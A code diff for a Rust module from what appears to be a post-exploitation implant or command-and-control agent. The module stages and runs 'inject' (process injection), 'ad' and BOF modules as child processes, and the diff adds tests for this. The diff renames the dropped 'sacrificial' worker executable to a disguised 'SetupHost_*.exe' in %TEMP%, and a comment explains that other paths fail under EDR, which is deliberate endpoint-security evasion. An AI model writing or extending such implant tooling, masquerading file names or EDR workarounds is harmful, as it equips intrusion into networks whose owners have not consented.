@@ -1,22 +1,19 @@
 //! Process-isolated module workers — Stage0 never LoadLibrary product L2 DLLs.
 //!
-//! Product modules (desktop / iso_host / inject) are registered as staged PE bytes
-//! and executed only in child processes under a Windows Job Object when possible.
+//! Product modules (inject / ad) are registered as staged PE bytes and executed
+//! only in child processes under a Windows Job Object when possible. Both are
+//! self-contained worker EXEs (no shared host). BOF is the exception: classic
+//! in-process execution via the `bof` L2 module (see module_loader).
 //! See docs/MODULE_WORKER_ISOLATION.md.
-//!
-//! Desktop RDP: default remains in-process `transport::desktop_bridge`. Long-lived
-//! worker path lives in [`desktop_worker`] (`CUPCAKE_DESKTOP_WORKER=1` → Job Object child).
 
-mod desktop_worker;
+mod ad_exec;
 mod ipc;
 pub(crate) mod job_object;
 mod state;
 
-pub use desktop_worker::{
-    decide_desktop_relay, desktop_lifecycle, parse_worker_status_line, pipe_desktop_worker_relay,
-    resolve_worker_binary, run_desktop_worker_relay, spawn_desktop_worker_ready,
-    DesktopRelayDecision, DesktopSession, DesktopWorkerChild, DesktopWorkerLifecycle,
-    ENV_DESKTOP_WORKER, ENV_DESKTOP_WORKER_BIN,
+pub use ad_exec::{
+    encode_ad_request_frame, execute_ad_job, parse_ad_response_frame, AdWorkerRequest,
+    AdWorkerResponse,
 };
 pub use ipc::{WorkerRequest, WorkerResponse, MAX_OUTPUT_BYTES, MAX_PAYLOAD_BYTES};
 pub use state::{WorkerState, WorkerStatus};
@@ -31,10 +28,11 @@ use std::sync::{Mutex, OnceLock};
 use std::time::Instant;
 
 /// Product modules that must never map into the agent process.
-pub const PRODUCT_WORKER_MODULES: &[&str] = &["desktop", "iso_host", "inject"];
+/// (`bof` is intentionally NOT here — classic BOF runs in-process by design.)
+pub const PRODUCT_WORKER_MODULES: &[&str] = &["inject", "ad"];
 
 pub fn is_product_worker_module(id: &str) -> bool {
-    matches!(id, "desktop" | "iso_host" | "iso-host" | "inject")
+    matches!(id, "inject" | "ad")
 }
 
 struct SupervisorInner {
@@ -142,8 +140,8 @@ impl ModuleSupervisor {
         }
     }
 
-    /// One-shot inject via iso_host worker process (KIND_INJECT=3).
-    /// Agent never maps inject DLL.
+    /// One-shot inject via the self-contained inject worker EXE (KIND_INJECT=3).
+    /// Agent never maps inject logic in-process.
     pub fn execute_inject_json(&self, json_body: &[u8], deadline_ms: u64) -> CommandResult {
         if json_body.len() > MAX_PAYLOAD_BYTES {
             return err_result("payload too large");
@@ -171,7 +169,7 @@ impl ModuleSupervisor {
             );
         }
 
-        let result = run_inject_via_iso_host(json_body, deadline_ms);
+        let result = run_inject_via_worker(json_body, deadline_ms);
 
         if let Ok(mut g) = self.inner.lock() {
             g.inflight = g.inflight.saturating_sub(1);
@@ -224,23 +222,6 @@ impl ModuleSupervisor {
             }
             g.inflight = 0;
         }
-        // Desktop long-lived session bookkeeping (active Job child killed by its Drop/job close).
-        desktop_worker::desktop_lifecycle().stop_all();
-    }
-
-    /// Desktop worker lifecycle status (not the Yamux bridge itself).
-    pub fn desktop_worker_status(&self) -> WorkerStatus {
-        desktop_worker::desktop_lifecycle().status()
-    }
-
-    /// Start desktop session bookkeeping (spawn is via `spawn_desktop_worker_ready`).
-    pub fn desktop_worker_start(&self, host: &str, port: u16) -> Result<u64, String> {
-        desktop_worker::desktop_lifecycle().start_session(host, port)
-    }
-
-    /// Stop desktop session bookkeeping / Job Object child session.
-    pub fn desktop_worker_stop(&self, request_id: Option<u64>) -> Result<(), String> {
-        desktop_worker::desktop_lifecycle().stop_session(request_id)
     }
 }
 
@@ -253,9 +234,10 @@ fn err_result(msg: impl Into<String>) -> CommandResult {
     }
 }
 
-/// Spawn iso_host PE with KIND_INJECT job; Job Object kill-on-close + deadline wait.
+/// Spawn the staged inject worker EXE with a KIND_INJECT job; Job Object
+/// kill-on-close + deadline wait. The inject module PE is itself the worker.
 #[cfg(windows)]
-fn run_inject_via_iso_host(json_body: &[u8], deadline_ms: u64) -> CommandResult {
+fn run_inject_via_worker(json_body: &[u8], deadline_ms: u64) -> CommandResult {
     let pe = match resolve_worker_host_pe() {
         Ok(p) => p,
         Err(e) => return err_result(e),
@@ -373,37 +355,29 @@ fn run_inject_via_iso_host(json_body: &[u8], deadline_ms: u64) -> CommandResult 
 }
 
 #[cfg(not(windows))]
-fn run_inject_via_iso_host(_json_body: &[u8], _deadline_ms: u64) -> CommandResult {
+fn run_inject_via_worker(_json_body: &[u8], _deadline_ms: u64) -> CommandResult {
     err_result("inject worker: windows only")
 }
 
 #[cfg(windows)]
 fn resolve_worker_host_pe() -> Result<Vec<u8>, String> {
-    // Prefer supervisor-registered iso_host PE
-    if let Some(pe) = supervisor().get_pe("iso_host") {
+    // The staged inject module PE is itself the sacrificial worker EXE.
+    if let Some(pe) = supervisor().get_pe("inject") {
         if pe.len() > 64 && pe[0] == b'M' && pe[1] == b'Z' {
             return Ok(pe);
         }
     }
-    // Fallback: module_loader host_pe (same process staging)
-    #[cfg(feature = "module-loader")]
-    {
-        if let Some(pe) = crate::module_loader::registry().get_host_pe("iso_host") {
-            if pe.len() > 64 && pe[0] == b'M' && pe[1] == b'Z' {
-                return Ok(pe);
-            }
-        }
-    }
-    Err("iso_host worker PE missing — stage module iso_host first".into())
+    Err("inject worker PE missing — stage module inject first".into())
 }
 
 #[cfg(windows)]
 fn write_temp_host(pe: &[u8]) -> Result<PathBuf, String> {
+    // Prefer %TEMP% + .exe (INetCache/.tmp often CreateProcess err=5 under EDR).
+    // This is the sacrificial host PE path only — inject job JSON stays on the pipe.
     let mut dir = std::env::temp_dir();
     let name = format!(
-        "~WK{:08X}{:04X}.tmp",
-        crate::utils::next_u32(),
-        (crate::utils::next_u32() & 0xffff) as u16
+        "SetupHost_{:08X}.exe",
+        crate::utils::next_u32_secure()
     );
     dir.push(name);
     std::fs::write(&dir, pe).map_err(|e| format!("write host: {e}"))?;
@@ -444,11 +418,117 @@ mod tests {
 
     #[test]
     fn product_ids_recognized() {
-        assert!(is_product_worker_module("desktop"));
+        assert!(!is_product_worker_module("desktop"));
         assert!(is_product_worker_module("inject"));
-        assert!(is_product_worker_module("iso_host"));
+        assert!(is_product_worker_module("ad"));
+        // bof is classic in-process — deliberately not a process worker
+        assert!(!is_product_worker_module("bof"));
+        // retired ids must not map to workers
+        assert!(!is_product_worker_module("dotnet"));
         assert!(!is_product_worker_module("shell"));
         assert!(!is_product_worker_module("plugin"));
+    }
+
+    #[test]
+    fn ad_register_ready_without_mapping() {
+        let s = ModuleSupervisor {
+            inner: Mutex::new(SupervisorInner {
+                pe: HashMap::new(),
+                status: HashMap::new(),
+                fail_streak: HashMap::new(),
+                inflight: 0,
+            }),
+            max_concurrent: 4,
+            circuit_open_after: 5,
+        };
+        let mut pe = vec![0u8; 64];
+        pe[0] = b'M';
+        pe[1] = b'Z';
+        s.register_pe("ad", &pe).unwrap();
+        assert!(s.is_ready("ad"));
+        assert_eq!(s.get_pe("ad").unwrap().len(), 64);
+        // Stage0 holds PE bytes only in supervisor map — no LoadLibrary path here
+        assert!(!s.get_pe("ad").unwrap().is_empty());
+    }
+
+    #[test]
+    fn ad_frame_roundtrip_pure() {
+        let req = AdWorkerRequest {
+            request_id: "r1".into(),
+            op: "ping".into(),
+            params: serde_json::json!({}),
+            deadline_ms: 5000,
+        };
+        let frame = encode_ad_request_frame(&req).expect("encode");
+        assert!(frame.len() >= 4);
+        let len = u32::from_le_bytes([frame[0], frame[1], frame[2], frame[3]]) as usize;
+        assert_eq!(len + 4, frame.len());
+        let resp_json = br#"{"request_id":"r1","status":"ok","stdout":"pong","stderr":"","error_code":""}"#;
+        let mut out = Vec::new();
+        out.extend_from_slice(&(resp_json.len() as u32).to_le_bytes());
+        out.extend_from_slice(resp_json);
+        let resp = parse_ad_response_frame(&out).expect("parse");
+        assert_eq!(resp.status, "ok");
+        assert_eq!(resp.stdout, "pong");
+    }
+
+    #[test]
+    fn ad_execute_missing_pe() {
+        let r = execute_ad_job("ping", &serde_json::json!({}), 1000);
+        // May already have PE from another test; only assert when empty
+        if supervisor().get_pe("ad").is_none() {
+            assert!(
+                r.stderr.contains("module_required:ad")
+                    || r.stderr.contains("ad worker")
+                    || r.stderr.contains("missing"),
+                "stderr={}",
+                r.stderr
+            );
+        }
+    }
+
+    /// Real sacrificial PE path: register built cupcake-ad-worker and ping.
+    /// Skips cleanly if the PE is not on disk (CI without prior cargo build -p cupcake-ad-worker).
+    #[test]
+    #[cfg(windows)]
+    fn ad_worker_ping_via_supervisor_real_pe() {
+        let candidates = [
+            std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+                .join("..")
+                .join("target")
+                .join("debug")
+                .join("cupcake-ad-worker.exe"),
+            std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+                .join("..")
+                .join("target")
+                .join("release")
+                .join("cupcake-ad-worker.exe"),
+        ];
+        let pe_path = candidates.iter().find(|p| p.is_file());
+        let Some(pe_path) = pe_path else {
+            eprintln!("skip: cupcake-ad-worker.exe not built (cargo build -p cupcake-ad-worker)");
+            return;
+        };
+        let pe = std::fs::read(pe_path).expect("read ad worker pe");
+        assert!(pe.len() > 64 && pe[0] == b'M' && pe[1] == b'Z');
+        supervisor()
+            .register_pe("ad", &pe)
+            .expect("register ad pe");
+        assert!(supervisor().is_ready("ad"));
+        // Stage0 must not Manual-Map: product path only stores bytes
+        let r = execute_ad_job("ping", &serde_json::json!({}), 30_000);
+        assert!(
+            r.stderr.is_empty() || r.stdout.contains("pong") || r.stdout.contains("ok"),
+            "stdout={} stderr={}",
+            r.stdout,
+            r.stderr
+        );
+        assert!(
+            r.stdout.contains("pong") || r.stdout == "ok" || r.stdout.contains("ok"),
+            "expected pong from real worker, got stdout={} stderr={}",
+            r.stdout,
+            r.stderr
+        );
     }
 
     #[test]
@@ -466,11 +546,11 @@ mod tests {
         let mut pe = vec![0u8; 64];
         pe[0] = b'M';
         pe[1] = b'Z';
-        s.register_pe("desktop", &pe).unwrap();
-        assert!(s.is_ready("desktop"));
-        assert_eq!(s.status_of("desktop").state, WorkerState::Ready);
-        assert_eq!(s.status_of("desktop").as_str(), "worker_ready");
-        assert_eq!(s.get_pe("desktop").unwrap().len(), 64);
+        s.register_pe("inject", &pe).unwrap();
+        assert!(s.is_ready("inject"));
+        assert_eq!(s.status_of("inject").state, WorkerState::Ready);
+        assert_eq!(s.status_of("inject").as_str(), "worker_ready");
+        assert_eq!(s.get_pe("inject").unwrap().len(), 64);
     }
 
     #[test]
@@ -487,6 +567,7 @@ mod tests {
         };
         assert!(s.register_pe("shell", &[b'M', b'Z', 0, 0]).is_err());
         assert!(s.register_pe("desktop", b"notpe").is_err());
+        assert!(s.register_pe("inject", b"notpe").is_err());
     }
 
     #[test]
@@ -591,11 +672,11 @@ mod tests {
         let mut pe = vec![0u8; 64];
         pe[0] = b'M';
         pe[1] = b'Z';
-        supervisor().register_pe("iso_host", &pe).unwrap();
-        assert!(supervisor().is_ready("iso_host"));
+        supervisor().register_pe("ad", &pe).unwrap();
+        assert!(supervisor().is_ready("ad"));
         supervisor().stop_all();
-        assert!(!supervisor().is_ready("iso_host"));
-        assert!(supervisor().get_pe("iso_host").is_none());
+        assert!(!supervisor().is_ready("ad"));
+        assert!(supervisor().get_pe("ad").is_none());
     }
 
     #[test]
@@ -621,29 +702,4 @@ mod tests {
         assert!(!should_force_kill_on_wait(true), "signaled → keep");
     }
 
-    #[test]
-    fn desktop_worker_lifecycle_api_on_supervisor() {
-        let s = ModuleSupervisor {
-            inner: Mutex::new(SupervisorInner {
-                pe: HashMap::new(),
-                status: HashMap::new(),
-                fail_streak: HashMap::new(),
-                inflight: 0,
-            }),
-            max_concurrent: 4,
-            circuit_open_after: 5,
-        };
-        // Default relay decision is always bridge (skeleton).
-        assert_eq!(
-            decide_desktop_relay(),
-            DesktopRelayDecision::UseBridge
-        );
-        let id = s.desktop_worker_start("127.0.0.1", 3389).unwrap();
-        assert!(matches!(
-            s.desktop_worker_status().state,
-            WorkerState::Ready
-        ));
-        s.desktop_worker_stop(Some(id)).unwrap();
-        assert_eq!(s.desktop_worker_status().state, WorkerState::Stopped);
-    }
 }
